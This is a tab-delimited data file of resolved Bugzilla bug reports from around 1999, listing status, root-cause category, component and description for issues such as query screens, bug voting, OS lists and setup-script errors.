Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
8096%TAB%929316760%TAB%5503%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need "BeOS" added to Bugzilla%TAB%Need "BeOS" added to Bugzilla
8279%TAB%929480153%TAB%4351%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%changedto not in query.cgi defaults%TAB%changedto not in query.cgi defaults
8458%TAB%929629538%TAB%5556%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla 2.4 is not automagically emailing passwords%TAB%Bugzilla 2.4 is not automagically emailing passwords
8493%TAB%929702612%TAB%1698%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Component descriptions are truncated.%TAB%Component descriptions are truncated.
8647%TAB%929991808%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Allow sorting by last changed date & time.,Query screen should have option to sort on last changed date/time.%TAB%Allow sorting by last changed date & time.,Query screen should have option to sort on last changed date/time.
8650%TAB%929998741%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Allow easy access to queries through initial screen.%TAB%Allow easy access to queries through initial screen.
8716%TAB%930063313%TAB%1537%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%make bugzilla associate patches with who attached them%TAB%make bugzilla associate patches with who attached them
8823%TAB%930153544%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Include a find bug link on the bug updated page,Include a "find bug #" form on the bug updated page%TAB%Include a find bug link on the bug updated page,Include a "find bug #" form on the bug updated page
9302%TAB%931253050%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Would be nice if attachment + number was a link too.%TAB%Would be nice if attachment + number was a link too.
9310%TAB%931257293%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%View Bug Activity does not document Assigned To changes.%TAB%View Bug Activity does not document Assigned To changes.
9352%TAB%931335663%TAB%5609%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Version names longer than 16 characters causes problems,bugs.version varchar(16) vs 64 and reserved word conflict%TAB%Version names longer than 16 characters causes problems,bugs.version varchar(16) vs 64 and reserved word conflict
9409%TAB%931377072%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Reporting/Charting%TAB%Allow any combination of Products in summary reports.%TAB%Allow any combination of Products in summary reports.
10524%TAB%932988863%TAB%6071%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%typo in defparams.pl%TAB%typo in defparams.pl
11155%TAB%933629357%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Support bug flags.,Support bug flags/tags/radars,Anyone should be able to invent keywords!,Support bug flags/tags/radars/keywords.%TAB%Support bug flags.,Support bug flags/tags/radars,Anyone should be able to invent keywords!,Support bug flags/tags/radars/keywords.
11167%TAB%933671464%TAB%5304%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Unable to change several bugs at once to 'VERIFED' [Patch]%TAB%Unable to change several bugs at once to 'VERIFED' [Patch]
11223%TAB%933701662%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bug voting.%TAB%Bug voting.
11242%TAB%933733301%TAB%5304%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%A Mail is sent more than once to a person [Patch]%TAB%A Mail is sent more than once to a person [Patch]
11328%TAB%933809522%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Table-Based Query Screen,Created Advanced (More Than Now) & Basic Query Screens%TAB%Table-Based Query Screen,Created Advanced (More Than Now) & Basic Query Screens
11901%TAB%934598836%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Creating/Changing Bugs,User Interface%TAB%Change Bugzilla comments line-wrapping policy%TAB%Change Bugzilla comments line-wrapping policy
11929%TAB%934680295%TAB%4907%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Place bug template in Bugzilla forms.%TAB%Place bug template in Bugzilla forms.
12282%TAB%935262632%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Reporting/Charting%TAB%General summary reports.%TAB%General summary reports.
12284%TAB%935283279%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Column specification support.,let me specify which columns to display in a bug list%TAB%Column specification support.,let me specify which columns to display in a bug list
12285%TAB%935283460%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Ability to edit query behind a bug list.%TAB%Ability to edit query behind a bug list.
12309%TAB%935382669%TAB%4432%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Missing "Unix"-platform...,need "Platform: UNIX" and maybe also "OS: All UNIX",want "Software Platform:" posix, unix, win32, macos, x11, gtk, qt,Missing "Unix"-platform,Need to be able to choose all versions of an OS%TAB%Missing "Unix"-platform...,need "Platform: UNIX" and maybe also "OS: All UNIX",want "Software Platform:" posix, unix, win32, macos, x11, gtk, qt,Missing "Unix"-platform,Need to be able to choose all versions of an OS
12324%TAB%935404466%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla query page doesn't run selectProduct() on load%TAB%Bugzilla query page doesn't run selectProduct() on load
12577%TAB%935682315%TAB%6531%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Invalid HTML / Don't use GET%TAB%Invalid HTML / Don't use GET
12583%TAB%935684815%TAB%4681%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla does not handle restricted bugs very well.,Milestone Plan CGI script does not handle restricted bugs very well.%TAB%Bugzilla does not handle restricted bugs very well.,Milestone Plan CGI script does not handle restricted bugs very well.
12819%TAB%936019280%TAB%3853%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add cc field to bulk change on bugs.,Add/remove cc field to bulk change on bugs.%TAB%Add cc field to bulk change on bugs.,Add/remove cc field to bulk change on bugs.
13075%TAB%936297036%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Quip maintenance%TAB%Quip maintenance
13324%TAB%936775054%TAB%5455%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Creating/Changing Bugs%TAB%Dependency graphs don't work in Bugzilla%TAB%Dependency graphs don't work in Bugzilla
13534%TAB%936898405%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Administration%TAB%REMIND and LATER considered harmful.%TAB%REMIND and LATER considered harmful.
13540%TAB%936914224%TAB%5151%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Bugzilla-General%TAB%Usage of "bug" would serve better as "report" in many cases,Bugzilla should be more generic, adaptable, and customizable,[HELP WANTED] Bugzilla should be more generic, adaptable, and customizable,Bugzilla should be more generic, adaptable, and customizable%TAB%Usage of "bug" would serve better as "report" in many cases,Bugzilla should be more generic, adaptable, and customizable,[HELP WANTED] Bugzilla should be more generic, adaptable, and customizable,Bugzilla should be more generic, adaptable, and customizable
13626%TAB%937109325%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%loaded query doesn't show "Sort By" correctly.%TAB%loaded query doesn't show "Sort By" correctly.
14169%TAB%937562177%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%View bug activity shows QAC numbers rather than names%TAB%View bug activity shows QAC numbers rather than names
14461%TAB%937914742%TAB%4019%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Administration%TAB%Can't delete a QA contact from edit components%TAB%Can't delete a QA contact from edit components
14529%TAB%937934167%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Send notifications based on union of notifiers before and after change.%TAB%Send notifications based on union of notifiers before and after change.
14858%TAB%938167987%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%cc QA Contact when a bug is set to FIXED%TAB%cc QA Contact when a bug is set to FIXED
14887%TAB%938181195%TAB%2365%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%HTML form controls,bugzilla should use <label> tag in forms%TAB%HTML form controls,bugzilla should use <label> tag in forms
15083%TAB%938509012%TAB%302291%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%depends and depending verbage not destinctive enough%TAB%depends and depending verbage not destinctive enough
15193%TAB%938604663%TAB%5051%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Patch: New GD Perl module will not produce .GIF charts.%TAB%Patch: New GD Perl module will not produce .GIF charts.
15808%TAB%939321019%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Can't execute personal query.%TAB%Can't execute personal query.
15809%TAB%939322290%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Query/Bug List%TAB%Query.cgi/Buglist.cgi URL optimisation,Query.cgi/Buglist.cgi URL optimization,buglist.cgi URL character length optimization%TAB%Query.cgi/Buglist.cgi URL optimisation,Query.cgi/Buglist.cgi URL optimization,buglist.cgi URL character length optimization
15811%TAB%939322504%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Votes capability on query page.%TAB%Votes capability on query page.
15890%TAB%939393611%TAB%1869%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Query for fixed bugs by resolution date no longer works%TAB%Query for fixed bugs by resolution date no longer works
15940%TAB%939460384%TAB%1749%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Sort by votes should sort descending instead of ascending%TAB%Sort by votes should sort descending instead of ascending
15945%TAB%939463428%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Interaction between voting and dependencies in sending email%TAB%Interaction between voting and dependencies in sending email
15966%TAB%939493421%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%CC list is a set, not an unordered list.%TAB%CC list is a set, not an unordered list.
15980%TAB%939517103%TAB%6349%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla 3,Bugzilla,Bugzilla-General%TAB%Password shown in the Location-bar,Password shown in the Location-bar and in html%TAB%Password shown in the Location-bar,Password shown in the Location-bar and in html
16000%TAB%939550564%TAB%7502%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%new users all unable to login: profiles.cryptpassword is NULL%TAB%new users all unable to login: profiles.cryptpassword is NULL
16009%TAB%939570413%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Reporting/Charting%TAB%General summary charts%TAB%General summary charts
16016%TAB%939577313%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Votes field gives wrong value in bug lists.%TAB%Votes field gives wrong value in bug lists.
16029%TAB%939593918%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Creating/Changing Bugs%TAB%Win 98 not auto recognised.%TAB%Win 98 not auto recognised.
16150%TAB%939669979%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Voting changes last changed date.%TAB%Voting changes last changed date.
16237%TAB%939738822%TAB%22599%TAB%CLOSED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Enhanced user management,Store author of comment seems as user id,Store author of comment as user id%TAB%Enhanced user management,Store author of comment seems as user id,Store author of comment as user id
16363%TAB%939828324%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Would like to sort Status Whiteboard Column%TAB%Would like to sort Status Whiteboard Column
16401%TAB%939873967%TAB%7653%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl error for first-time user%TAB%checksetup.pl error for first-time user
16436%TAB%939898602%TAB%7672%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Product and version field sizes in bugs table can cause truncation.%TAB%Product and version field sizes in bugs table can cause truncation.
16454%TAB%939904562%TAB%7675%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl can't handle database with password%TAB%checksetup.pl can't handle database with password
16775%TAB%940317433%TAB%7677%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Query confusing for newbies,[RFE] optional simplified version of query.cgi,Optional simplified query interface (query.cgi)%TAB%Query confusing for newbies,[RFE] optional simplified version of query.cgi,Optional simplified query interface (query.cgi)
17156%TAB%940778510%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to say bug.moz.org is for 5.x only.%TAB%Need to say bug.moz.org is for 5.x only.
17193%TAB%940852426%TAB%5300%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Uncaught exception in checksetup.pl%TAB%Uncaught exception in checksetup.pl
17286%TAB%940944173%TAB%1584%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%Need product-specific target fix version%TAB%Need product-specific target fix version
17304%TAB%940955480%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Testing QA contact send on fixed.%TAB%Testing QA contact send on fixed.
17453%TAB%941089647%TAB%8002%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla 3,Bugzilla,Bugzilla-General%TAB%Enumerators and Long-term use of Bugzilla,Enumerators in Bugzilla are not cross-DB compatible%TAB%Enumerators and Long-term use of Bugzilla,Enumerators in Bugzilla are not cross-DB compatible
17464%TAB%941101332%TAB%3858%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%indicate closed bugs in mail messages,user preferences for notification mail%TAB%indicate closed bugs in mail messages,user preferences for notification mail
17773%TAB%941536341%TAB%8081%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%First user should be made superuser,Checksetup.pl should create maintainer if database is empty.%TAB%First user should be made superuser,Checksetup.pl should create maintainer if database is empty.
17779%TAB%941537031%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Testzilla,Bugzilla,Bugzilla-General%TAB%Create a new testzilla account page - submit button shows "submit query",Create a new account page - submit button shows "submit query"%TAB%Create a new testzilla account page - submit button shows "submit query",Create a new account page - submit button shows "submit query"
17827%TAB%941555700%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%dependency reports wrong,dependency reports misuse the word "closed".%TAB%dependency reports wrong,dependency reports misuse the word "closed".
18325%TAB%942134842%TAB%1698%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bug Writing Guidelines plugs should use more direct language%TAB%Bug Writing Guidelines plugs should use more direct language
18349%TAB%942147180%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%problems loading remembered query with --- for TM,query.cgi target_milestone value does not reload form SELECTED item%TAB%problems loading remembered query with --- for TM,query.cgi target_milestone value does not reload form SELECTED itemIf a remembered query has the target milestone as blank "---" (not nothing selected, but the last item selected), then when it is *loaded* (not run), it shows up incorrectly.  The Target Milestone select box has, at the bottom, an extra option, which is the Component of that query, selected.  TO REPRODUCE:  * create a named query with      + Target Milestone = "---"      + Component = "Browser-General"  * do "load the remembered query" on that query  * the select for Target Milestone has an extra option at the bottom, "Browser-General", and it's selected, so the query doesn't work unless you change the TM!  (Using NN 4.61 Linux.)
19006%TAB%942762927%TAB%3822%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%RFE: Bug pages should have "look up bug #[   ]" entry field.%TAB%RFE: Bug pages should have "look up bug #[   ]" entry field.This is the biggest productivity block relating to bugzilla that I have anymore.  When I've just changed one bug and gotten the resulting page back I usually don't want to operate on whatever the next bug bugzilla showed me is. Most times I need to skip around to bugs that wouldn't easily fit in a single query.  If each bug page simply had the text entry field allowing me to specify the next bug I want to go to, this would save me a LOT of time.
19346%TAB%942999856%TAB%6303%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Miscellaneous,Bugzilla,Bugzilla-General%TAB%Time to add Win 2000 to list of OS in Bugzilla%TAB%Time to add Win 2000 to list of OS in BugzillaOverview: Windows 2000 does not appear on the list of possible OS to specify in a bug report. As it involves enough re-architecting that bugs reported on this OS could conceivably be due to a change in either API implementation or adherence to APIs on the OS end, rather than to anything wrong with Mozilla, capturing this data seems important.  Bug 18400, "MacOS 9 is out" should be seen to at the same time.  If bug 17453 "Enumerators and Long-term use of Bugzilla" is going to get attention, this may be the time, and while checking to make sure that the new OS are showing up properly may be the time to see to bug 16029, "Win 98 not auto recognised".  While those choosing to use the Windows 2000 betas are admittedly not the most likely to be using Bugzilla, soon it will be time to test on it regardless.
19910%TAB%943305999%TAB%4019%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Bugzilla eats other bugzilla's cookies,One Bugzilla eats other Bugzilla's cookies on same server%TAB%Bugzilla eats other bugzilla's cookies,One Bugzilla eats other Bugzilla's cookies on same serverThe real problem here is that bugzilla uses a path of '/' for its cookie and  uses a statis name for the cookie.  It should really use a cookie name that is  dependend upon the name of the database and a path that is based upon its  location in the web tree.  Otherwise, if you have several bugzilla installations  on a single server, the cookies will stomp upon one another.
20006%TAB%943381517%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bad assignee on bug report.%TAB%Bad assignee on bug report.Currently bug #19459 has an assignee of "__UNKNOWN__", at least that's the way it appears to me.
20050%TAB%943439969%TAB%7868%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%M11 can't handle bugzilla front page%TAB%M11 can't handle bugzilla front pageas of Wed Nov 24 14:34:00 EST 1999, i can't enter this bug report from mozilla, because M11 (Build ID: 19999111520) on NT and Solaris can't follow any of the links on left side of the bugzilla homepage.  There is a javascript link to "Show Mozilla bug no." and it has overflowed to consume all of the links on the left side of the page (above the ant), which include the "Enter a new bug report" link. *d'oh*  I can see the page without difficulty in NN 4.5.  It's not a JavaScript bug. It's an HTML bug, and it's my fault. I incorrectly nested HTML tags in the new page, which stuffed the links. (I rand it through an HTML validator, but the validator doesn't check HTML tags hidden in JavaScript, you see.)  I noted this in bug 16546 -- there's a fixed version attached to that bug, waiting to be checked in. CCing endico and terry, because they were the ones involved in getting the new page up in the first place.  Apologies for the inconvenience, but I've now supplied the fix and it's up to terry and co. to put it up ASAP.
